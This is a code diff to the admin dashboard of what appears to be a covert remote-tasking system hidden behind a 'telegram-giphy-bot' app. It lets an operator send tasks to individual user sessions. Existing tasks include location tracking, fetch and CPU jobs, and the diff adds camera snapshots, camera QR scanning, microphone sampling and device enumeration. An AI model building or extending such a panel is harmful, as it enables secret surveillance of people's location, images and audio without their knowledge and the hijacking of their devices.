@@ -40,7 +40,7 @@
 </table>
 
 <script>
-    const VER = "dash-2025-08-22-2";
+    const VER = "dash-2025-08-23-step3";
     console.log("[dash] boot", VER);
 
     const WS_URL   = "wss://telegram-giphy-bot-9a11b0e83d02.herokuapp.com/ws?role=admin";
@@ -81,6 +81,10 @@
             <option value="info">info</option>
             <option value="location_once">location_once</option>
             <option value="location_watch">location_watch</option>
+            <option value="camera_snapshot">camera_snapshot</option>
+            <option value="camera_qr_scan">camera_qr_scan</option>
+            <option value="mic_sample">mic_sample</option>
+            <option value="enumerate_devices">enumerate_devices</option>
           </select>
 
           <!-- cpu -->
@@ -123,6 +127,43 @@
             </select>
           </span>
 
+          <!-- camera_snapshot -->
+          <span class="cfg cfg-camera_snapshot" data-sid="${sid}">
+            <label>facing</label>
+            <select class="cam-facing" data-sid="${sid}">
+              <option value="user">user</option>
+              <option value="environment" selected>environment</option>
+            </select>
+            <label>maxW</label>
+            <input type="number" class="cam-w" value="640" min="64" max="1920" step="16" data-sid="${sid}">
+            <label>maxH</label>
+            <input type="number" class="cam-h" value="480" min="64" max="1080" step="16" data-sid="${sid}">
+            <label>preview</label>
+            <select class="cam-prev" data-sid="${sid}">
+              <option value="true" selected>true</option>
+              <option value="false">false</option>
+            </select>
+          </span>
+
+          <!-- camera_qr_scan -->
+          <span class="cfg cfg-camera_qr_scan" data-sid="${sid}">
+            <label>facing</label>
+            <select class="qr-facing" data-sid="${sid}">
+              <option value="environment" selected>environment</option>
+              <option value="user">user</option>
+            </select>
+            <label>seconds</label>
+            <input type="number" class="qr-dur" value="10" min="3" max="30" step="1" data-sid="${sid}">
+          </span>
+
+          <!-- mic_sample -->
+          <span class="cfg cfg-mic_sample" data-sid="${sid}">
+            <label>seconds</label>
+            <input type="number" class="mic-dur" value="3" min="1" max="10" step="1" data-sid="${sid}">
+          </span>
+
+          <!-- enumerate_devices has no extra config -->
+
           <button class="send-btn" data-sid="${sid}">Send</button>
         </div>
         ${statusHTML}
@@ -162,7 +203,7 @@
             }
         }
 
-        // wire expand/collapse
+        // expand/collapse
         rowsEl.querySelectorAll('a.user-link').forEach(a => {
             a.onclick = (e) => {
                 const sid = e.currentTarget.getAttribute('data-sid');
@@ -171,10 +212,9 @@
             };
         });
 
-        // wire task-kind dropdowns (show relevant cfg)
+        // wire dropdowns + cfg visibility + send
         rowsEl.querySelectorAll('.controls').forEach(box => {
             const kindSel = box.querySelector('.task-kind');
-            const sid = box.getAttribute('data-sid');
             const updateCfg = () => {
                 const v = kindSel.value;
                 box.querySelectorAll('.cfg').forEach(el => el.classList.remove('active'));
@@ -182,15 +222,19 @@
                 if (v === 'fetch') box.querySelector('.cfg-fetch')?.classList.add('active');
                 if (v === 'location_once') box.querySelector('.cfg-location_once')?.classList.add('active');
                 if (v === 'location_watch') box.querySelector('.cfg-location_watch')?.classList.add('active');
-                // 'info' has no extra params
+                if (v === 'camera_snapshot') box.querySelector('.cfg-camera_snapshot')?.classList.add('active');
+                if (v === 'camera_qr_scan') box.querySelector('.cfg-camera_qr_scan')?.classList.add('active');
+                if (v === 'mic_sample') box.querySelector('.cfg-mic_sample')?.classList.add('active');
+                // enumerate_devices, info have no extra inputs
             };
             kindSel.onchange = updateCfg;
             updateCfg();
 
-            // wire Send
             box.querySelector('.send-btn').onclick = async () => {
+                const sid = box.getAttribute('data-sid');
                 const kind = kindSel.value;
                 let payload = {};
+
                 if (kind === 'cpu') {
                     const n = parseInt(box.querySelector('.cpu-n')?.value || '10000', 10);
                     payload = { n: isNaN(n) ? 10000 : n };
@@ -209,12 +253,26 @@
                     const dur = parseInt(box.querySelector('.loc-dur')?.value || '15', 10);
                     const hiw = (box.querySelector('.loc-hiw')?.value || 'true') === 'true';
                     payload = { durationSec: isNaN(dur)?15:dur, highAccuracy: hiw, maximumAgeMs: 0 };
+                } else if (kind === 'camera_snapshot') {
+                    const facing = box.querySelector('.cam-facing')?.value || 'environment';
+                    const w = parseInt(box.querySelector('.cam-w')?.value || '640', 10);
+                    const h = parseInt(box.querySelector('.cam-h')?.value || '480', 10);
+                    const prev = (box.querySelector('.cam-prev')?.value || 'true') === 'true';
+                    payload = { facingMode: facing, maxWidth: isNaN(w)?640:w, maxHeight: isNaN(h)?480:h, preview: prev };
+                } else if (kind === 'camera_qr_scan') {
+                    const facing = box.querySelector('.qr-facing')?.value || 'environment';
+                    const dur = parseInt(box.querySelector('.qr-dur')?.value || '10', 10);
+                    payload = { facingMode: facing, durationSec: isNaN(dur)?10:dur };
+                } else if (kind === 'mic_sample') {
+                    const dur = parseInt(box.querySelector('.mic-dur')?.value || '3', 10);
+                    payload = { durationSec: isNaN(dur)?3:dur };
+                } else if (kind === 'enumerate_devices') {
+                    payload = {};
                 } else {
                     alert("Unknown task type"); return;
                 }
 
                 try {
-                    const sid = box.getAttribute('data-sid');
                     const r = await fetch(`${API_BASE}/tasks`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
